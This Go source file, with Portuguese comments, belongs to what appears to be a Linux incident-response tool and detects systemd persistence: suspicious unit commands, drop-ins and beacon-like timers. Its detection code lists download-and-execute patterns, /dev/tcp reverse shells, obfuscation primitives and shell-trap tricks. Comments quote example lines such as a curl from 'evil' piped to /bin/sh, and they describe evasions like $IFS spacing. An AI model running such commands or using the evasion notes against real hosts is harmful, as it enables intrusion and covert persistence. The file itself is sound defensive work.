package checks

import (
	"strconv"
	"strings"

	"github.com/lex0c/aletheia/internal/check"
	"github.com/lex0c/aletheia/internal/env"
	"github.com/lex0c/aletheia/internal/facts"
)

// Nenhum destes declara CapSystemd, e a omissão é deliberada.
//
// Host sem systemd não tem persistência por unit para encontrar: o check cobriu
// tudo que havia, que é nada. Declarar CapSystemd como Optional faria toda
// varredura de Alpine ou de contêiner sair com cobertura degradada — o mesmo
// gritar-lobo que a distinção entre "processo que terminou" e "processo que não
// pude ler" existe para evitar.
//
// A lacuna de VERDADE, essa continua declarada, e vem do coletor: systemd
// PRESENTE com nenhuma unit legível.
func init() {
	check.Register(unitExecSuspect)
	check.Register(unitDropIn)
	check.Register(unitTimerFrequent)
}

// unitExecSuspect — runbook §7.2.
//
// O que a unit EXECUTA, lido do arquivo e não do systemctl. Duas famílias de
// sinal, e elas são diferentes:
//
//	o CAMINHO      binário rodando de /tmp, /dev/shm ou home — mesma pergunta
//	               da §8, feita sobre o gatilho em vez do processo
//	o INTERPRETADOR curl|bash, base64 -d|sh, python -c: o payload não está na
//	               unit, está do outro lado da rede (§3.16)
var unitExecSuspect = check.Check{
	ID:       "persist.unit_exec_suspect",
	Ref:      "7.2",
	Title:    "unit de systemd executa de lugar suspeito, ou baixa o que executa",
	Group:    "persist",
	Mode:     check.ModeAuto,
	Sources:  env.SourceLive | env.SourceImage,
	Requires: env.CapFilesystem,
	Wtf:      true,
	FalsePositives: []string{
		"instalador e provisionamento legítimos usam curl e sh — cloud-init, " +
			"agente de nuvem e ferramenta de configuração aparecem aqui. O que " +
			"os separa é a unit ter dono conhecido e vir de pacote",
		"unit de desenvolvimento rodando binário de /home é rotina em estação de " +
			"trabalho; em servidor de produção, quase nunca",
	},
	Run: func(self check.Check, f *facts.Facts, e *env.Env) check.Result {
		var r check.Result
		for i := range f.Units {
			u := &f.Units[i]
			for _, ex := range u.Exec {
				motivo, sev, ok := execSuspect(ex.Cmd)
				if !ok {
					continue
				}
				ev := []string{
					ex.Key + "=" + ex.Cmd,
					motivo,
					"arquivo: " + u.Path,
				}
				if u.DropInFor != "" {
					// Drop-in tem check próprio, mas o comando suspeito também
					// vale aqui: o operador precisa ver o comando.
					ev = append(ev, "é um DROP-IN de "+u.DropInFor+
						": a unit original está intacta e não mostra isto")
				}
				ev = append(ev, unitContext(u)...)

				fd := self.F(sev, u.Name, "", ev...)
				fd.Quando, fd.QuandoFonte = u.ModUTC, "mtime do arquivo da unit"
				fd.NextSteps = []string{
					"a config EFETIVA inclui drop-ins: `systemctl cat " + u.Name + "`",
					"remova a persistência ANTES de matar o processo, senão o systemd " +
						"o ressuscita (runbook §19)",
				}
				r.Findings = append(r.Findings, fd)
			}
		}
		// append sobre o nil, e uma vez só. A atribuição direta ALIASA o slice
		// do Facts — um append posterior escreveria na capacidade sobressalente
		// de um fato compartilhado por todos os checks — e a linha repetida
		// duplicava cada razão na seção de cobertura, que é justamente a seção
		// em que a ferramenta se audita.
		r.Partial = append(r.Partial, f.PersistDenied["unit"]...)
		return r
	},
}

// unitDropIn — runbook §7.2.
//
// "Um ExecStartPre= num drop-in de serviço legítimo é persistência quase
// perfeita: o serviço continua com o mesmo nome, o mesmo arquivo .service
// intacto, e roda o payload antes de subir. Ler o .service não mostra isso."
//
// Por isso o check existe separado do de comando suspeito: o sinal aqui é a
// FORMA — alguém acrescentou execução a uma unit que não é dele —, mesmo
// quando o comando parece inocente.
var unitDropIn = check.Check{
	ID:       "persist.unit_dropin_exec",
	Ref:      "7.2",
	Title:    "drop-in acrescenta execução a uma unit existente",
	Group:    "persist",
	Mode:     check.ModeAuto,
	Sources:  env.SourceLive | env.SourceImage,
	Requires: env.CapFilesystem,
	Wtf:      true,
	FalsePositives: []string{
		"drop-in é o mecanismo RECOMENDADO para customizar unit de pacote, e " +
			"`systemctl edit` gera exatamente isto. Em host gerenciado por " +
			"Ansible, Puppet ou Chef há vários, todos legítimos",
		"o sinal não é o drop-in existir: é ele acrescentar EXECUÇÃO. Drop-in " +
			"que só ajusta limite, ambiente ou dependência não entra aqui",
	},
	Run: func(self check.Check, f *facts.Facts, e *env.Env) check.Result {
		var r check.Result
		for i := range f.Units {
			u := &f.Units[i]
			if u.DropInFor == "" || len(u.Exec) == 0 {
				continue
			}
			var cmds []string
			for _, ex := range u.Exec {
				cmds = append(cmds, ex.Key+"="+ex.Cmd)
			}
			ev := []string{
				"altera a unit " + u.DropInFor + " sem tocar no arquivo dela",
				"arquivo: " + u.Path,
			}
			ev = append(ev, cmds...)
			ev = append(ev, "`cat` no .service original NÃO mostra isto — só `systemctl cat`")

			fd := self.F(check.SevWarn, u.DropInFor, "", ev...)
			fd.Quando, fd.QuandoFonte = u.ModUTC, "mtime do drop-in"
			fd.NextSteps = []string{
				"veja a config efetiva: `systemctl cat " + u.DropInFor + "`",
				"e tudo que sobrescreve algo do sistema: `systemd-delta --type=extended`",
			}
			r.Findings = append(r.Findings, fd)
		}
		r.Partial = append(r.Partial, f.PersistDenied["unit"]...)
		return r
	},
}

// unitTimerFrequent — runbook §7.2 e §2.7.
//
// Timer é o cron do systemd, e um intervalo curto é a forma do beacon: conecta,
// faz a tarefa, dorme. O retrato de processo e de conexão não pega — entre uma
// execução e outra não há nada rodando. O gatilho, esse, está em disco.
var unitTimerFrequent = check.Check{
	ID:       "persist.timer_frequent",
	Ref:      "7.2",
	Title:    "timer com intervalo curto: a forma de um beacon",
	Group:    "persist",
	Mode:     check.ModeAuto,
	Sources:  env.SourceLive | env.SourceImage,
	Requires: env.CapFilesystem,
	Wtf:      true,
	FalsePositives: []string{
		"monitoração e coleta de métrica rodam em intervalo curto por projeto. " +
			"São poucas e têm nome conhecido — e vêm de pacote, não de /etc",
		"o intervalo por si não acusa nada: ele diz ONDE procurar na §2.7, " +
			"correlacionando com conexão no mesmo período",
	},
	Run: func(self check.Check, f *facts.Facts, e *env.Env) check.Result {
		var r check.Result
		for i := range f.Units {
			u := &f.Units[i]
			if u.Kind != "timer" {
				continue
			}
			seg, desc, ok := timerInterval(u)
			if !ok || seg > maxBeaconSeg {
				continue
			}
			ev := []string{
				"dispara a cada " + desc,
				"arquivo: " + u.Path,
			}
			ev = append(ev, unitContext(u)...)
			ev = append(ev, "correlacione com conexão nesse mesmo intervalo (runbook §2.7): "+
				"o beacon só é visível na janela estendida, não no retrato")

			fd := self.F(check.SevWarn, u.Name, "", ev...)
			fd.Quando, fd.QuandoFonte = u.ModUTC, "mtime do arquivo da unit"
			fd.NextSteps = []string{
				"veja o que ele dispara: a unit de mesmo nome com sufixo .service",
				"amostre a rede pelo intervalo do timer, não por instantes (runbook §2.7)",
			}
			r.Findings = append(r.Findings, fd)
		}
		r.Partial = append(r.Partial, f.PersistDenied["unit"]...)
		return r
	},
}

// maxBeaconSeg é o teto do que conta como "curto". Quinze minutos cobre a
// cadência típica de beacon sem transformar todo timer horário em achado.
const maxBeaconSeg = 15 * 60

// timerInterval devolve o menor intervalo que o timer produz.
func timerInterval(u *facts.Unit) (int, string, bool) {
	if u.OnUnitActiveSec != "" {
		if s, ok := parseSystemdTime(u.OnUnitActiveSec); ok {
			return s, u.OnUnitActiveSec, true
		}
	}
	for _, cal := range u.OnCalendar {
		if s, d, ok := calendarInterval(cal); ok {
			return s, d, true
		}
	}
	return 0, "", false
}

// parseSystemdTime entende "30s", "5min", "2h", "1h30m" e o número puro, que o
// systemd lê como segundos.
func parseSystemdTime(s string) (int, bool) {
	s = strings.TrimSpace(strings.ToLower(s))
	if s == "" {
		return 0, false
	}
	total, num, any := 0, 0, false
	for i := 0; i < len(s); {
		j := i
		for j < len(s) && s[j] >= '0' && s[j] <= '9' {
			j++
		}
		if j == i {
			return 0, false
		}
		n, err := strconv.Atoi(s[i:j])
		if err != nil {
			return 0, false
		}
		k := j
		for k < len(s) && (s[k] < '0' || s[k] > '9') {
			k++
		}
		unit := strings.TrimSpace(s[j:k])
		mult, ok := timeUnits[unit]
		if !ok {
			return 0, false
		}
		num, any = n, true
		total += num * mult
		i = k
	}
	if !any {
		return 0, false
	}
	return total, true
}

var timeUnits = map[string]int{
	"": 1, "s": 1, "sec": 1, "secs": 1, "second": 1, "seconds": 1,
	"m": 60, "min": 60, "mins": 60, "minute": 60, "minutes": 60,
	"h": 3600, "hr": 3600, "hour": 3600, "hours": 3600,
	"d": 86400, "day": 86400, "days": 86400,
	"w": 604800, "week": 604800, "weeks": 604800,
}

// calendarInterval extrai o período de um OnCalendar. Só o caso que importa:
// o campo com "*/N", que é como se escreve "a cada N".
//
// Não é um parser de OnCalendar — esse formato é grande, e implementá-lo
// inteiro para responder "isto é frequente?" seria trocar um sinal por um
// gerador de falsos positivos.
func calendarInterval(cal string) (int, string, bool) {
	fields := strings.Fields(strings.ToLower(strings.TrimSpace(cal)))
	if len(fields) == 0 {
		return 0, "", false
	}
	// atalhos que o systemd define
	switch fields[0] {
	case "minutely":
		return 60, cal, true
	case "hourly":
		return 3600, cal, true
	}
	// o campo de tempo é o último; hh[:mm[:ss]]
	hhmm := fields[len(fields)-1]
	parts := strings.Split(hhmm, ":")
	if len(parts) > 3 {
		return 0, "", false
	}
	// A unidade sai da POSIÇÃO ABSOLUTA no formato hh:mm:ss, não da distância
	// até o fim da string. Indexar pela distância assumia que o último
	// componente é sempre SEGUNDO, o que só vale na forma completa:
	// `OnCalendar=*:*/30` (forma abreviada e válida, "a cada 30 minutos") era
	// lido como 30 SEGUNDOS e virava persist.timer_frequent num timer de meia
	// em meia hora, enquanto `*/6:00` (a cada 6 h) virava 360 s.
	//
	//	3 componentes → hh:mm:ss, o último é segundo
	//	2 componentes → hh:mm,    o último é minuto
	//	1 componente  → hh,       o último é hora
	unit := []int{1, 60, 3600}
	desloc := 3 - len(parts)
	for i := len(parts) - 1; i >= 0; i-- {
		k := (len(parts) - 1 - i) + desloc
		if k >= len(unit) {
			continue
		}
		u := unit[k]
		// O repetidor tem DUAS grafias no systemd: `*/M` e `N/M` (com base
		// inicial). `*:0/5` é a forma mais comum de "a cada 5 minutos" e não
		// tem o prefixo `*/` — ela devolvia false, e o beacon real não era
		// detectado.
		_, n, temBarra := strings.Cut(parts[i], "/")
		if !temBarra {
			continue
		}
		if v, err := strconv.Atoi(n); err == nil && v > 0 {
			return v * u, cal, true
		}
	}
	return 0, "", false
}

// execSuspect classifica um comando de unit. Devolve o motivo em português
// porque ele vai direto para a evidência: o operador precisa saber POR QUE,
// não só que disparou.
func execSuspect(cmd string) (string, check.Severity, bool) {
	// A comparação é sobre a linha NORMALIZADA. Todo padrão abaixo tem espaço
	// embutido — "curl ", "base64 -d", " -c", "trap " —, e um espaço literal é
	// a coisa mais fácil de evadir que existe: `curl\t-s`, `base64  -d`,
	// `curl$IFS-s`. Quem escreve a linha escolhe o byte; o classificador tem de
	// olhar a FORMA. O caminho do executável continua saindo do `cmd` original,
	// porque ali o branco separa tokens e não decora.
	low := colapsaBranco(strings.ToLower(cmd))

	// Interpretador consumindo código de fora: o payload não está aqui.
	//
	// `fetch` é o downloader de FreeBSD e existe em imagem Alpine; `lwp-download`
	// vem com o perl. Nenhum deles é curl, e todos entregam a mesma coisa.
	for _, pat := range []string{"curl ", "wget ", "fetch ", "lwp-download ",
		"aria2c ", "base64 -d", "base64 --decode"} {
		if strings.Contains(low, pat) && pipesToShell(low) {
			return "baixa e executa: o payload não está na unit, está do outro lado da rede",
				check.SevCritical, true
		}
	}
	if strings.Contains(low, "/dev/tcp/") {
		return "usa /dev/tcp: shell reverso embutido, sem binário externo (runbook §3.16)",
			check.SevCritical, true
	}
	if motivo, ok := trapDeShell(low); ok {
		return motivo, check.SevCritical, true
	}

	// Interpretador com código EM LINHA que decodifica a si mesmo.
	//
	// O `pipesToShell` acima exige um pipe literal, e o adversário do cenário
	// A2 não deixa nenhum: `python3 -c "os.system(base64.b64decode(...))"` põe
	// o pipe DENTRO do blob, onde nenhuma leitura de texto o encontra.
	//
	// Não é assinatura de família: é a forma. Configuração de persistência que
	// esconde o próprio conteúdo não tem explicação legítima — administrador
	// não ofusca o que ele mesmo instalou, e quem lê o arquivo depois é ele.
	if temInterpretadorEmLinha(low) && ofuscaPayload(low) {
		return "interpretador com código em linha que DECODIFICA o próprio payload: " +
				"o que vai executar não está legível aqui, e configuração de " +
				"persistência não tem motivo para se esconder de quem a lê",
			check.SevCritical, true
	}

	// O caminho do executável — o primeiro token, sem os prefixos que o
	// systemd aceita ("-", "@", "+", "!", "!!").
	//
	// O teste de "parece caminho" existe porque este classificador também é
	// usado sobre linha de SHELL, onde o primeiro token pode ser qualquer
	// coisa: `/dev/tty[0-9]*)` é um padrão de `case`, não um programa, e sem
	// esta guarda o /etc/profile.d/gpm.sh de qualquer Arch virava achado.
	// O ALVO EFETIVO, não o primeiro token. Um wrapper que roda outro programa
	// — `sh -c /tmp/.x`, `sudo /tmp/.x`, `env /tmp/.x`, `tcpd /tmp/.x` — deixa
	// `/bin/sh`, `/usr/bin/sudo`, `/usr/sbin/tcpd` como primeiro token: todos
	// legítimos, e o payload em /tmp/.x desaparecia da decisão. É a mesma
	// evasão em systemd (ExecStart=/bin/sh -c /tmp/.x), em gatilho e agora em
	// inetd/xinetd, então mora aqui, num só lugar.
	bin := strings.TrimLeft(alvoEfetivo(cmd), "-@+!:")
	if !pareceCaminho(bin) {
		return "", 0, false
	}
	if why, ok := suspectDir(bin); ok {
		return "executa de " + bin + " — " + why, check.SevCritical, true
	}
	if strings.HasPrefix(bin, "/home/") || strings.HasPrefix(bin, "/root/") {
		return "executa de diretório pessoal: " + bin, check.SevWarn, true
	}
	return "", 0, false
}

// alvoEfetivo desembrulha os wrappers que executam OUTRO programa e devolve o
// que de fato roda. Sem isto, "o primeiro executável" — legítimo em todo
// wrapper — é uma regra de evasão que vale para systemd, gatilho e inetd/xinetd.
//
//	sudo|env|nohup|setsid|doas|exec|stdbuf|tcpd PROG  ->  PROG (pulando flags e VAR=val)
//	sh|bash|... -c "PROG …"                           ->  o primeiro caminho de PROG
//	PROG (sem wrapper)                                ->  PROG
func alvoEfetivo(cmd string) string {
	toks := strings.Fields(colapsaBranco(cmd))
	// Teto de desembrulho: `sudo env nohup …` aninhado é raro, mas o laço não
	// pode girar para sempre num token que ele não consome.
	for passo := 0; passo < 8 && len(toks) > 0; passo++ {
		base := baseDe(strings.TrimLeft(toks[0], "-@+!:"))
		switch {
		case ehWrapperDeExec(base):
			// Pula o wrapper E as opções dele — respeitando quais opções
			// CONSOMEM UM ARGUMENTO. "pule todo token que começa com -" era a
			// evasão: em `sudo -u root /tmp/.x` o `-u` come `root`, o laço parava
			// em `root` e devolvia `root` como alvo — o /tmp/.x, o payload real,
			// sumia da decisão. Cada wrapper tem a sua tabela de arity.
			comArg := wrapperOpcaoComArg[base]
			toks = toks[1:]
			usouDuracao := false
			for len(toks) > 0 {
				t := toks[0]
				if t == "--" { // fim das opções: o próximo token é o programa
					toks = toks[1:]
					break
				}
				if strings.HasPrefix(t, "-") && t != "-" {
					toks = toks[1:]
					// `--opt=val` / `-oVAL`: valor anexado, nada mais a consumir.
					if strings.ContainsRune(t, '=') {
						continue
					}
					// forma separada `-o VAL`: consome o argumento se a opção o exige.
					if comArg[t] && len(toks) > 0 {
						toks = toks[1:]
					}
					continue
				}
				// `env FOO=bar prog`: a atribuição faz parte do env, não é o alvo.
				if base == "env" && strings.ContainsRune(t, '=') {
					toks = toks[1:]
					continue
				}
				// `timeout 30 prog`: a duração é posicional, uma só, antes do alvo.
				if base == "timeout" && !usouDuracao && ehDuracao(t) {
					usouDuracao = true
					toks = toks[1:]
					continue
				}
				break // este é o programa
			}
		case interpretadoresDePipe[base]:
			// shell: o alvo real está no argumento do -c. Sem -c, o próprio
			// shell é o alvo (um shell interativo de serviço já é anômalo).
			for i := 1; i < len(toks); i++ {
				if toks[i] == "-c" && i+1 < len(toks) {
					// O alvo do -c costuma vir entre aspas ('/tmp/.x -flag'); a
					// aspa de abertura gruda no primeiro token e o descaracteriza
					// como caminho. Descasca-se só a da ponta.
					if c := primeiroCaminho(strings.Join(toks[i+1:], " ")); c != "" {
						return strings.TrimLeft(c, "'\"")
					}
					return toks[0]
				}
			}
			return toks[0]
		default:
			return toks[0]
		}
	}
	return ""
}

// ehWrapperDeExec diz se o token é um wrapper que executa OUTRO programa. A
// lista é a mesma que virava evasão de "primeiro executável" em systemd,
// gatilho e inetd/xinetd.
func ehWrapperDeExec(base string) bool {
	switch base {
	case "sudo", "env", "nohup", "setsid", "doas", "exec", "stdbuf", "tcpd",
		"ionice", "nice", "timeout":
		return true
	}
	return false
}

// wrapperOpcaoComArg lista, por wrapper, as opções em FORMA SEPARADA que
// consomem o próximo token como valor (`-u root`, `--signal KILL`). O que não
// estiver aqui é tratado como flag sem argumento — inclusive as formas anexadas
// (`-oL`, `--opt=val`, `nice -10`), que já carregam o valor no próprio token.
// Errar para "flag sem argumento" é o lado SEGURO: consome de menos e o alvo
// real continua adiante; consumir de mais é que engoliria o payload.
var wrapperOpcaoComArg = map[string]map[string]bool{
	"sudo": {"-u": true, "--user": true, "-g": true, "--group": true,
		"-h": true, "--host": true, "-p": true, "--prompt": true,
		"-C": true, "--close-from": true, "-R": true, "--chroot": true,
		"-D": true, "--chdir": true, "-U": true, "--other-user": true,
		"-r": true, "--role": true, "-t": true, "--type": true},
	"doas":    {"-u": true, "-C": true, "-a": true},
	"env":     {"-u": true, "--unset": true, "-C": true, "--chdir": true, "-S": true, "--split-string": true},
	"exec":    {"-a": true},
	"stdbuf":  {"-i": true, "--input": true, "-o": true, "--output": true, "-e": true, "--error": true},
	"timeout": {"-s": true, "--signal": true, "-k": true, "--kill-after": true},
	"nice":    {"-n": true, "--adjustment": true},
	"ionice":  {"-c": true, "--class": true, "-n": true, "--classdata": true, "-p": true, "--pid": true},
}

// ehDuracao reconhece o argumento de `timeout`: um número com sufixo opcional
// s/m/h/d. Não é caminho nem opção, e não pode ser confundido com o alvo.
func ehDuracao(s string) bool {
	if s == "" {
		return false
	}
	s = strings.TrimRight(s, "smhd")
	if s == "" {
		return false
	}
	for i := 0; i < len(s); i++ {
		if (s[i] < '0' || s[i] > '9') && s[i] != '.' {
			return false
		}
	}
	return true
}

// pareceCaminho recusa o que não pode ser caminho de executável. Metacaractere
// de shell é a marca de que aquele token é sintaxe, não programa.
func pareceCaminho(s string) bool {
	if s == "" || !strings.HasPrefix(s, "/") {
		return false
	}
	return !strings.ContainsAny(s, "*?[]()|;&$\"'`<>")
}

// interpretadoresDePipe é o conjunto que, do lado direito de um pipe, torna a
// linha um baixa-e-executa.
var interpretadoresDePipe = map[string]bool{
	"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true,
	"ash": true, "busybox": true, "fish": true,
	"python": true, "python2": true, "python3": true,
	"perl": true, "ruby": true, "php": true, "node": true, "lua": true,
}

// pipesToShell diz se a linha canaliza para um interpretador.
//
// A comparação é pelo BASENAME do primeiro token depois do pipe, e não por
// prefixo literal. Casar "|sh" e "| sh" deixava passar a forma mais óbvia que
// existe — `curl -s http://evil/i | /bin/sh` —, porque ali o que segue o pipe é
// " /bin/sh". Tab no lugar do espaço tinha o mesmo efeito, e `|sudo bash`
// também. Como execSuspect é o classificador ÚNICO, cada evasão dessas zerava
// junto persist.cron_suspect, trigger_exec, shell_startup e modprobe.
func pipesToShell(low string) bool {
	for i := 0; i < len(low); i++ {
		if low[i] != '|' {
			continue
		}
		// "||" é operador lógico, não pipe de dados.
		if i+1 < len(low) && low[i+1] == '|' {
			i++
			continue
		}
		resto := strings.TrimLeft(low[i+1:], " \t")
		for _, tok := range strings.Fields(resto) {
			// A linha vem de dentro de aspas com frequência
			// (`sh -c "… | bash"`), e o token carrega a pontuação do shell.
			tok = strings.Trim(tok, "\"'`();&{}")
			// sudo/env/nohup e afins prefixam o comando de verdade.
			if b := baseDe(tok); interpretadoresDePipe[b] {
				return true
			} else if b != "sudo" && b != "env" && b != "nohup" && b != "setsid" &&
				b != "doas" && b != "exec" {
				break
			}
		}
	}
	return false
}

func firstToken(s string) string {
	if i := strings.IndexAny(strings.TrimSpace(s), " \t"); i > 0 {
		return strings.TrimSpace(s)[:i]
	}
	return strings.TrimSpace(s)
}

// unitContext acrescenta o que decide se a unit importa: ela vai rodar? com
// qual identidade? o systemd a ressuscita?
func unitContext(u *facts.Unit) []string {
	var ev []string
	if u.Enabled() {
		ev = append(ev, "HABILITADA por "+strings.Join(u.EnabledBy, ", "))
	} else if u.DropInFor == "" {
		ev = append(ev, "não há symlink em *.wants/ apontando para ela: "+
			"pode ser disparada por outra unit, por socket ou por timer")
	}
	if u.Restart != "" && u.Restart != "no" {
		ev = append(ev, "Restart="+u.Restart+
			" — o systemd vira o supervisor: ele ressuscita o que você matar")
	}
	if u.User != "" {
		ev = append(ev, "User="+u.User)
	}
	if !u.Vendor {
		ev = append(ev, "não veio de pacote ("+u.Scope+", fora de /usr/lib): "+
			"unit em /etc tem PRECEDÊNCIA e pode sobrescrever uma legítima de mesmo nome")
	}
	if u.ModUTC != "" {
		ev = append(ev, "modificada em "+u.ModUTC)
	}
	return ev
}

// temInterpretadorEmLinha diz se o comando entrega código pela linha de
// comando, em vez de apontar para um arquivo que se pode ler.
func temInterpretadorEmLinha(low string) bool {
	low = colapsaBranco(low)
	var temInterp bool
	for _, i := range []string{"python", "perl", "ruby", "php", "node", "bash", "sh ", "zsh"} {
		if strings.Contains(low, i) {
			temInterp = true
			break
		}
	}
	if !temInterp {
		return false
	}
	return strings.Contains(low, " -c") || strings.Contains(low, " -e") ||
		strings.Contains(low, " -r ") || strings.Contains(low, "eval")
}

// ofuscaPayload reconhece as primitivas que transformam texto ilegível em
// código executável. É a forma, não a família.
func ofuscaPayload(low string) bool {
	low = colapsaBranco(low)
	for _, p := range []string{
		"b64decode", "base64.b64", "atob(", "codecs.decode", "unhexlify",
		"decode('hex", "fromcharcode", "pack(\"h",
		"base64 -d", "base64 --decode", "openssl enc -d", "xxd -r",
	} {
		if strings.Contains(low, p) {
			return true
		}
	}
	// `eval` e `exec` são CHAMADAS: o parêntese pode vir colado ou separado, e
	// casar só "eval(" deixava `eval (x)` passar. O nome tem de estar isolado —
	// senão `retrieval(x)` e `exec_hook(y)` viravam achado.
	for _, nome := range []string{"eval", "exec"} {
		if chamaFuncao(low, nome) {
			return true
		}
	}
	return false
}

// chamaFuncao acha `nome` seguido de parêntese, com ou sem espaço entre os
// dois, e exige que o nome não seja sufixo de outro identificador.
func chamaFuncao(low, nome string) bool {
	for i := 0; ; {
		j := strings.Index(low[i:], nome)
		if j < 0 {
			return false
		}
		p := i + j
		i = p + len(nome)
		if p > 0 && (ehIdent(low[p-1]) || low[p-1] == '_') {
			continue // sufixo de outro identificador: retrieval(, exec_hook(
		}
		resto := strings.TrimLeft(low[i:], " ")
		if strings.HasPrefix(resto, "(") {
			return true
		}
	}
}

func ehIdent(c byte) bool {
	return c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || c >= '0' && c <= '9'
}

// colapsaBranco troca todo branco por UM espaço e expande $IFS.
//
// Existe porque todo classificador deste arquivo casa padrão com espaço
// embutido, e espaço literal é a evasão mais barata que há: trocar por tab,
// duplicar, ou usar `$IFS` — que o shell expande para branco e que aparece em
// dropper real justamente para derrotar peneira de texto.
func colapsaBranco(s string) string {
	if !strings.ContainsAny(s, "\t\n\r$") && !strings.Contains(s, "  ") {
		return s // caminho comum: nada a normalizar
	}
	s = strings.ReplaceAll(s, "${ifs}", " ")
	s = strings.ReplaceAll(s, "${IFS}", " ")
	s = strings.ReplaceAll(s, "$ifs", " ")
	s = strings.ReplaceAll(s, "$IFS", " ")
	var b strings.Builder
	b.Grow(len(s))
	espaco := false
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '\v' || c == '\f' {
			espaco = true
			continue
		}
		if espaco && b.Len() > 0 {
			b.WriteByte(' ')
		}
		espaco = false
		b.WriteByte(c)
	}
	return b.String()
}

// trapDeShell reconhece a persistência por armadilha de sinal.
//
// `trap` associa um comando a um evento do shell, e num arquivo de
// INICIALIZAÇÃO isso é persistência: a linha vale para toda sessão daquela
// conta, e o comando não aparece em lista de processo, nem em cron, nem em
// unit.
//
//	DEBUG   roda ANTES DE CADA COMANDO. É o mais forte: dá execução contínua e
//	        serve de registrador do que o usuário digita
//	EXIT    roda ao encerrar a sessão, quando ninguém está olhando
//	ERR     roda a cada comando que falha
//
// O uso legítimo de `trap` é em SCRIPT — limpar arquivo temporário ao sair. Num
// arquivo de rc de shell interativo ele quase não tem razão de existir, e é
// por isso que o classificador só o vê onde vê: nas linhas de gatilho.
func trapDeShell(low string) (string, bool) {
	low = colapsaBranco(low)
	i := strings.Index(low, "trap ")
	if i != 0 && (i < 0 || !ehInicioDeComando(low, i)) {
		return "", false
	}
	resto := low[i+len("trap "):]
	// `trap` sem comando (ex.: `trap - INT`) apenas RESTAURA o padrão: não
	// executa nada, e acusá-lo seria acusar limpeza de armadilha.
	if strings.HasPrefix(strings.TrimSpace(resto), "-") {
		return "", false
	}
	for _, ev := range []string{"debug", "exit", "err"} {
		if !strings.Contains(resto, ev) {
			continue
		}
		motivo := "arma um `trap` de shell em " + strings.ToUpper(ev) +
			": o comando roda "
		switch ev {
		case "debug":
			motivo += "ANTES DE CADA COMANDO da sessão, e serve tanto de execução " +
				"contínua quanto de registrador do que se digita"
		case "exit":
			motivo += "ao encerrar a sessão, quando ninguém está olhando"
		default:
			motivo += "a cada comando que falhar"
		}
		return motivo + " — e não aparece em processo, cron nem unit", true
	}
	return "", false
}

// ehInicioDeComando evita casar `trap` no meio de outra palavra ou dentro de um
// caminho: `/usr/bin/mytrap ` não arma armadilha nenhuma.
func ehInicioDeComando(low string, i int) bool {
	c := low[i-1]
	return c == ' ' || c == '\t' || c == ';' || c == '&' || c == '|'
}
